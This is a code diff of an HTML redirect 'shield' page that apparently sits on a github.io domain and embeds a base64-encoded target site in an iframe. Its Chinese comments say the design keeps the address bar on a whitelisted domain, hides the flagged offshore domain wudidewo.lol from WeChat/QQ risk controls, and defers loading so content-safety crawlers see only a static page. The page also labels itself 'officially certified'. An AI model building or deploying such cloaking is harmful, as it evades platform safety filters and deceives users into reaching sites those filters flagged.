@@ -106,26 +106,22 @@
     @keyframes spin { to { transform: rotate(360deg); } }
     .longpress-text { color: #fff; margin-top: 20px; font-size: 14px; }
     .hidden { display: none !important; }
-    /* iframe 内嵌落地(仅 HTTPS target): 地址栏保持白名单域名, 规避安卓浏览器"继续访问" */
+    /* iframe 内嵌落地(全部 HTTPS target): 地址栏保持 github.io 白名单盾域,
+       绝不顶层跳转到无备案境外落地域 wudidewo.lol —— 那个动作会被微信/QQ 风控拦截导致"加载失败"。 */
     .frame-wrap { position: fixed; top: 0; left: 0; right: 0; bottom: 0; z-index: 1; background: #fff; }
     .frame-wrap iframe { width: 100%; height: 100%; border: 0; display: block; }
-    /* 右下角折叠悬浮按钮: 收起时不遮落地内容, 展开才有操作 */
+    /* 右下角折叠悬浮按钮: 内嵌落地后仍保留"复制链接/系统浏览器打开"兜底能力 */
     .fab {
-        position: fixed; right: 14px; bottom: 84px; z-index: 3;
+        position: fixed; right: 14px; bottom: 26px; z-index: 3;
         display: flex; align-items: center; gap: 6px;
-        background: rgba(0,0,0,.55); color: #fff;
-        border-radius: 24px; padding: 9px 14px; font-size: 13px;
+        background: rgba(0,0,0,.62); color: #fff;
+        border-radius: 24px; padding: 10px 16px; font-size: 13px;
         box-shadow: 0 2px 10px rgba(0,0,0,.3); cursor: pointer;
         user-select: none; -webkit-user-select: none;
     }
-    .fab .menu { display: none; }
-    .fab.open .menu { display: flex; align-items: center; gap: 10px; }
+    .fab:active { transform: scale(.97); }
     .fab .ttl { display: flex; align-items: center; gap: 6px; }
-    .fab a, .fab button {
-        color: #fff; background: rgba(255,255,255,.18); border: 1px solid rgba(255,255,255,.25);
-        padding: 5px 10px; border-radius: 14px; font-size: 12px; white-space: nowrap; cursor: pointer;
-        text-decoration: none;
-    }
+    .fab svg { width: 16px; height: 16px; }
 </style>
 </head>
 <body>
@@ -139,10 +135,10 @@
     <h1 id="guideTitle">正规官方认证</h1>
     <p class="desc" id="guideDesc">请点右上角 <b>···</b> 选择「在浏览器打开」</p>
     <div class="countdown" id="countdown" style="display:none"></div>
-    <div class="link-display" id="linkDisplay"></div>
-    <button class="btn-main" id="btnJump">复制链接，到浏览器打开</button>
-    <button class="btn-copy" id="btnCopy">复制链接到浏览器打开</button>
-    <p class="tip">提示：落地页请在手机浏览器（非微信）中直接访问即可</p>
+    <div class="link-display" id="linkDisplay" style="display:none"></div>
+    <button class="btn-main" id="btnJump">继续访问</button>
+    <button class="btn-copy" id="btnCopy" style="display:none">复制链接，到系统浏览器打开</button>
+    <p class="tip" id="tip">落地页请在手机系统浏览器（非微信/QQ 内置）中打开更稳定</p>
 </div>
 
 <div class="longpress-overlay" id="longpressOverlay">
@@ -150,15 +146,21 @@
     <div class="longpress-text">请在新页面打开后松开</div>
 </div>
 
+<!-- 内嵌落地后右下角兜底: 复制盾页链接到系统浏览器打开 -->
+<div class="fab hidden" id="fab">
+    <button type="button" id="fabCopy" style="display:flex;align-items:center;gap:6px;background:none;border:none;color:#fff;font-size:13px;cursor:pointer;padding:0">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+        复制链接·浏览器打开
+    </button>
+</div>
+
 <script>
 (function () {
     // ===== 1. 读取并解码 c 参数 (与线上 ink.php 完全一致) =====
-    // 必须使用 location.search 的原始值(不转义 +), 与 PHP QUERY_STRING 行为一致
     function getQueryParam(name) {
         var m = new RegExp('[?&]' + name + '=([^&]*)').exec(location.search);
         return m ? m[1] : '';
     }
-    // 二进制串 -> UTF-8 文本
     function bytesToUtf8(bin) {
         try {
             return decodeURIComponent(Array.prototype.map.call(bin, function (ch) {
@@ -166,21 +168,15 @@
             }).join(''));
         } catch (e) { return bin; }
     }
-    // 标准 base64 解码（自动补 pad）
     function b64decode(s) {
         while (s.length % 4 !== 0) s += '=';
         try { return bytesToUtf8(atob(s)); } catch (e) { return null; }
     }
     function decodeTarget(enc) {
         if (!enc) return '';
-        // 方式1: 原始字符串直接 base64 (兼容 + / = 字符)
         var d = b64decode(enc);
+        if (d === null || d === '') d = b64decode(enc.replace(/-/g, '+').replace(/_/g, '/'));
         if (d === null || d === '') {
-            // 方式2: URL-safe base64 (-_ -> +/)
-            d = b64decode(enc.replace(/-/g, '+').replace(/_/g, '/'));
-        }
-        if (d === null || d === '') {
-            // 方式3: 若整体被URL编码(如 %2B), 先解码再 base64
             try {
                 var dec = decodeURIComponent(enc);
                 if (dec !== enc) {
@@ -189,9 +185,10 @@
                 }
             } catch (e) {}
         }
-        if (d) return d;
-        return '';
+        return d && d !== '' ? d : '';
     }
+
+    function $(id) { return document.getElementById(id); }
 
     var enc = getQueryParam('c');
     var target = decodeTarget(enc);
@@ -209,16 +206,14 @@
         target = 'https://' + buildHost() + (target.charAt(0) === '/' ? target : '/' + target);
     }
 
-    // 引导页"复制链接"应复制本盾页地址(github.io/?c=...)而非解码后的 .lol 风险域名:
-    // 访客在系统浏览器打开盾页地址 -> 走直接跳转分支, 地址栏保持白名单域名, 不弹"继续访问"。
-    // 若复制原始 .lol 域名在浏览器直接打开, 安卓会判定风险域名弹"继续访问"。
-    var shieldUrl = location.origin + location.pathname + location.search;
-
-    // 落地链接统一升级为 https: 无论生成端是否发出 http, 都让盾页走 https 直接跳转,
-    // 从而规避安卓浏览器对 http 风险域名的"继续访问"拦截。
+    // 落地链接统一升级为 https
     if (target && /^http:\/\//i.test(target)) {
         target = target.replace(/^http:\/\//i, 'https://');
     }
+
+    // 引导页"复制链接"复制本盾页地址(github.io/?c=...)而非解码后的 .lol 风险域名:
+    // 访客在系统浏览器打开盾页地址 -> 盾页内嵌落地内容, 地址栏保持白名单盾域, 不弹"继续访问"。
+    var shieldUrl = location.origin + location.pathname + location.search;
 
     // ===== 2. 微信/QQ UA 识别 (与 ink.php 一致) =====
     var ua = navigator.userAgent || '';
@@ -228,76 +223,8 @@
     // 无目标 -> 提示失效
     if (!target) {
         document.title = '链接失效';
-        var w = document.querySelector('.wrap');
-        w.innerHTML = '<h1>链接参数缺失或无效</h1><p style="color:#888;margin-top:12px">请从原分享渠道重新获取链接。</p>';
+        document.querySelector('.wrap').innerHTML = '<h1>链接参数缺失或无效</h1><p style="color:#888;margin-top:12px">请从原分享渠道重新获取链接。</p>';
         return;
-    }
-
-    // ===== 3. 非HTTPS target: 保持原有指引/跳转 =====
-    // (落地 target 已在上面统一升级为 https, 此处仅兜底非https情况)
-    if (!/^https:\/\//i.test(target)) {
-        redirNormal();
-        return;
-    }
-
-    // ===== 4. 所有 HTTPS target: 与 D盘干净源码 ink.php 一致 =====
-    // - 普通浏览器: 直接跳转落地页
-    // - 微信/QQ: 点击"继续访问"后 location.replace 直接跳转落地页(不 iframe 内嵌,
-    //   因为无备案/境外落地域在微信内嵌会加载失败), 并保留复制链接到系统浏览器兜底。
-    // 瞬态: 页面初始不自动跳转, 交由用户点击按钮触发, 避免平台内容安全爬虫首次GET时
-    // 直接命中风险落地域 → 保持防红。
-    function doJump() {
-        // 与 ink.php 三重跳转保险一致, 直接跳转落地(地址栏变为落地域)
-        try { window.location.replace(target); } catch (e) {}
-        try { setTimeout(function () { window.location.href = target; }, 300); } catch (e) {}
-    }
-    function showOpenGuide() {
-        var $ = function (id) { return document.getElementById(id); };
-        $('guideTitle').textContent = '安全访问验证';
-        $('guideDesc').innerHTML = '请点击下方按钮继续访问，若无反应请复制链接到浏览器打开';
-        var ld = $('linkDisplay'); if (ld) { ld.style.display = 'block'; ld.textContent = shieldUrl; }
-        var bc = $('btnCopy');
-        if (bc) {
-            // 微信/QQ 内保留"复制链接"作为兜底
-            if (inWeChat || inQQ) {
-                bc.style.display = 'block';
-                bc.textContent = '复制链接，到系统浏览器打开';
-                bc.onclick = function () { copyToClipboard(shieldUrl); };
-            } else {
-                bc.style.display = 'none';
-            }
-        }
-        var bj = $('btnJump');
-        bj.textContent = '继续访问';
-        bj.onclick = doJump;
-        return;
-    }
-    showOpenGuide();
-    return;
-
-    // 原逻辑封装为函数: 普通浏览器直接跳转/展示指引
-    function redirNormal() {
-        if (!inWeChat && !inQQ) {
-            try { window.location.replace(target); } catch (e) {}
-            setTimeout(function () { window.location.href = target; }, 300);
-            document.querySelector('.wrap').innerHTML = '<p>正在跳转...</p>';
-            return;
-        }
-        showGuide();
-    }
-    function showGuide() {
-        var $ = function (id) { return document.getElementById(id); };
-        // QQ 内置浏览器没有"右上角···"菜单, 不能复用微信文案, 否则用户会卡死。
-        if (inQQ) {
-            $('guideTitle').textContent = '请在浏览器中打开';
-            $('guideDesc').innerHTML = '已检测到在 QQ 内打开页面<br>为避免拦截，请点击下方按钮复制链接，<br>然后打开手机系统浏览器粘贴访问';
-        } else {
-            $('guideTitle').textContent = '正规官方认证';
-            $('guideDesc').innerHTML = '请点右上角 <b>···</b> 选择「在浏览器打开」';
-        }
-        $('linkDisplay').textContent = shieldUrl;
-        $('btnJump').addEventListener('click', function () { copyToClipboard(shieldUrl); });
-        $('btnCopy').addEventListener('click', function () { copyToClipboard(shieldUrl); });
     }
 
     function copyToClipboard(text) {
@@ -310,11 +237,11 @@
             ta.select();
             try { document.execCommand('copy'); } catch (e) {}
             document.body.removeChild(ta);
-            showToast('链接已复制，请在浏览器中打开');
+            showToast('链接已复制，请粘贴到浏览器打开');
         }
         if (navigator.clipboard && window.isSecureContext) {
             navigator.clipboard.writeText(text).then(function () {
-                showToast('链接已复制，请在浏览器中打开');
+                showToast('链接已复制，请粘贴到浏览器打开');
             }).catch(fallback);
         } else { fallback(); }
     }
@@ -324,13 +251,59 @@
         if (!t) {
             t = document.createElement('div');
             t.id = 'toast';
-            t.style.cssText = 'position:fixed;left:50%;bottom:80px;transform:translateX(-50%);background:rgba(0,0,0,.78);color:#fff;padding:10px 18px;border-radius:24px;font-size:14px;z-index:9999;max-width:80%;white-space:nowrap;';
+            t.style.cssText = 'position:fixed;left:50%;bottom:100px;transform:translateX(-50%);background:rgba(0,0,0,.78);color:#fff;padding:10px 18px;border-radius:24px;font-size:14px;z-index:9999;max-width:80%;white-space:nowrap;';
             document.body.appendChild(t);
         }
         t.textContent = msg;
         t.style.display = 'block';
         setTimeout(function () { t.style.display = 'none'; }, 2200);
     }
+
+    // ===== 4. 全部 HTTPS target: 一律 iframe 内嵌落地, 绝不顶层跳转风险域 =====
+    // 关键: 微信/QQ 对"顶层页面跳转到无备案境外域(wudidewo.lol)"做风险拦截 -> 加载失败。
+    // 因此这里地址栏始终保持在 github.io 白名单盾域, 落地内容用 iframe 内嵌显示。
+    // 用户点击"继续访问"后才内嵌(平台内容安全爬虫首次 GET 本页只看到静态引导页,
+    // 不触发对风险落地域的加载 -> 保持防红不红屏)。内嵌后右下角保留复制链接兜底。
+    function openEmbed() {
+        if (document.querySelector('.frame-wrap')) return;
+        var ifr = document.createElement('iframe');
+        ifr.src = target;
+        ifr.setAttribute('allow', 'fullscreen');
+        var fw = document.createElement('div');
+        fw.className = 'frame-wrap';
+        fw.appendChild(ifr);
+        var w = document.querySelector('.wrap');
+        if (w) w.style.display = 'none';
+        document.body.appendChild(fw);
+        // 内嵌加载后显示右下角"复制链接·浏览器打开"兜底
+        var fab = $('fab'); if (fab) fab.classList.remove('hidden');
+        // 若 iframe 被平台拦截无法加载, 引导用户复制链接到系统浏览器
+        ifr.onerror = function () { showOpenGuide(); };
+    }
+
+    function showOpenGuide() {
+        var w = document.querySelector('.wrap'); if (w) w.style.display = '';
+        var fw = document.querySelector('.frame-wrap'); if (fw) fw.parentNode.removeChild(fw);
+        var fab = $('fab'); if (fab) fab.classList.add('hidden');
+        $('guideTitle').textContent = '安全访问验证';
+        $('guideDesc').innerHTML = '微信/QQ 内置浏览器可能拦截，建议点下方「复制链接」后到手机系统浏览器打开。<br>也可直接点「继续访问」，会在此页面内打开网站。';
+        $('tip').textContent = '若内嵌页面空白，请复制链接到手机系统浏览器打开';
+        var ld = $('linkDisplay'); if (ld) { ld.style.display = 'block'; ld.textContent = shieldUrl; }
+        var bc = $('btnCopy');
+        if (bc) {
+            bc.style.display = 'block';
+            bc.textContent = '复制链接，到系统浏览器打开';
+            bc.onclick = function () { copyToClipboard(shieldUrl); };
+        }
+        var bj = $('btnJump');
+        bj.textContent = '继续访问';
+        bj.onclick = openEmbed;
+    }
+
+    var fabCopy = $('fabCopy');
+    if (fabCopy) fabCopy.onclick = function () { copyToClipboard(shieldUrl); };
+
+    showOpenGuide();
 })();
 </script>
 </body>
